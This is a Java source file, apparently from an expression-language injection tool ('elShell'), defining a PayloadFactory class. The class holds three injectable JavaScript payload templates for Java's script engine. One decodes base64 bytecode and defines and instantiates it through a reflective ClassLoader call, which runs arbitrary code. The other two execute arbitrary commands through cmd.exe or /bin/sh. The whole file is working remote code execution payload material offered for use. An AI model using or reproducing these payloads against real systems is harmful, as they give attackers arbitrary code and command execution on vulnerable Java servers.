package com.droplab.Controller.elShell.Common;

/**
 * scriptengineManager payload生成器
 */
public class PayloadFactory {
    private final String anyCodeExecute="var codes=java.util.Base64.getDecoder().decode(\"%s\");var clazz = java.lang.Class.forName(\"java.lang.ClassLoader\");var method = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", Java.type('byte[]').class,Java.type('int').class, Java.type('int').class);method.setAccessible(true);var TestClass = method.invoke(java.lang.ClassLoader.getSystemClassLoader(),codes,0,codes.length);TestClass.newInstance();";
    private final String cmdExecuteWin="var str=\"%s\";var ss=str.split(\" \");s=[ss.length+2];s[0]='C:\\\\Windows\\\\system32\\\\cmd.exe';s[1]='/c';for(var i=0;i<ss.length;i++){s[i+2]=ss[i];}var process=java.lang.Runtime.getRuntime().exec(s);process.waitFor();";
    private final String cmdExecuteLinux="var str=\"%s\";var ss=str.split(\" \");s=[ss.length+2];s[0]='/bin/sh';s[1]='-c';for(var i=0;i<ss.length;i++){s[i+2]=ss[i];}var process=java.lang.Runtime.getRuntime().exec(s);process.waitFor();";

    private static PayloadFactory payloadFactory = null;

    public static PayloadFactory instance(){
        if(payloadFactory!=null){

        }else{
            payloadFactory=new PayloadFactory();
        }
        return payloadFactory;
    }

    public String getAnyCodeExecute() {
        return anyCodeExecute;
    }

    public String getCmdExecuteWin() {
        return cmdExecuteWin;
    }

    public String getCmdExecuteLinux() {
        return cmdExecuteLinux;
    }
}
